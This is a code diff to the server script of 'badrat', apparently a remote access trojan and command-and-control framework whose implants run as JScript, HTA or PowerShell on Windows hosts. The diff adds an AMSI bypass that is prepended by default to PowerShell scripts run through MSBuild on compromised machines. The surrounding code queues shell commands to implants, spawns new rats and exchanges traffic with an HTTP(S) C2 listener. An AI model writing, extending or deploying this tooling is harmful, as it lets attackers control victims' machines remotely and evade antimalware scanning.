@@ -27,6 +27,7 @@ ssl = args.ssl
 
 supported_types = ["c", "py", "js", "ps1", "hta"]
 msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
+prepend_amsi_bypass_to_psh = True
 
 # I should probably make a dict of dicts...
 commands = {}
@@ -84,8 +85,8 @@ def colors(value):
         else:
             return(BOLD + py + value + ENDC)
     except:
-        if(len(value) > 100):
-            return(UNDERLINE + value[0:96] + ENDC + "...")
+        if(len(value) > 120):
+            return(UNDERLINE + value[0:116] + ENDC + "...")
         else:
             return(UNDERLINE + value + ENDC)
 
@@ -107,16 +108,21 @@ def send_ratcode(ratID):
             return(ratcode)
 
 def get_psscript(filepath):
-   with open(Path(filepath).resolve() , "r") as fd:
-       content = fd.read()
-       content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
-       return(content)
+    with open(Path(filepath).resolve() , "r") as fd:
+        data = fd.read()
+        b64data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
+        return(b64data)
 
 def send_msbuild_xml(script):
-    with open(os.getcwd() + "/resources/nps_minified.xml" , "r") as fd:
-        data = fd.read().replace("~~REPLACE~~" , script)
-        data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
-        return data
+    with open(os.getcwd() + "/resources/nps_modified.xml" , "r") as fd:
+        msbuild_data = fd.read().replace("~~SCRIPT~~" , script)
+
+    amsi = ""
+    if(prepend_amsi_bypass_to_psh):
+        amsi = get_psscript(os.getcwd() + "/resources/Disable-Amsi.ps1")
+
+    msbuild_data = msbuild_data.replace("~~AMSI~~" , amsi)
+    return base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
 
 def serve_server(port=8080):
     app = Flask(__name__)
@@ -219,19 +225,20 @@ def get_help():
     print("clear -- clear the screen")
     print("")
     print("Rat commands: -- commands to interact with a badrat rat")
+    print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on agent type")
     print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
     print("spawn -- used to spawn a new rat in a new process.")
-    print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on agent type")
-    print("psh <local_powershell_script_path> -- Runs the powershell script on the rat")
+    print("psh <local_powershell_script_path> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
     print("The rats are written in Windows JScript and Powershell, run in a wscript.exe, mshta.exe, or powershell.exe process")
-    print("The server is written in python and uses an HTTP listener for C2 comms")
+    print("The server is written in python and uses an HTTP(S) listener for C2 comms")
     print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
     print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
     print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
-    print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe\n")
+    print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
+    print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution. This may not be desireable and can be turned off by changing the variable at the beginning of this script\n")
 
 if __name__ == "__main__":
     # Start the Flask server
@@ -256,7 +263,7 @@ if __name__ == "__main__":
             get_help()
 
         # View rats, their types, and their latest checkin times
-        elif(inp == "agents" or inp == "rats" or inp == "sessions"):
+        elif(inp == "agents" or inp == "rats" or inp == "impants" or inp == "sessions"):
             get_rats()
 
         # Remove rats -- either by ratID or all
@@ -283,7 +290,7 @@ if __name__ == "__main__":
                     if(inp == "back" or inp == "exit"):
                         break
 
-                    elif(inp == "agents" or inp == "rats" or inp == "implantss" or inp == "sessions"):
+                    elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
                         get_rats(ratID)
                         continue
 
@@ -298,15 +305,15 @@ if __name__ == "__main__":
                             inp = "spawn " + send_ratcode(ratID)
 
                     elif(str.startswith(inp, "psh ")):
-                        try:
-                            filepath = inp.split(" ")[1]
-                            if(types[ratID] == "ps1"):
-                                inp = "psh " + get_psscript(filepath)
-                            else:
-                                inp = "psh " + msbuild_path + " " + send_msbuild_xml(get_psscript(filepath))
-                        except:
-                            print("[!] Could not open file " + filepath + " for reading")
-                            continue
+                        #try:
+                        filepath = inp.split(" ")[1]
+                        if(types[ratID] == "ps1"):
+                            inp = "psh " + get_psscript(filepath)
+                        else:
+                            inp = "psh " + msbuild_path + " " + send_msbuild_xml(get_psscript(filepath))
+                        #except:
+                        #    print("[!] Could not open file " + filepath + " for reading")
+                        #    continue
 
 
                     print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
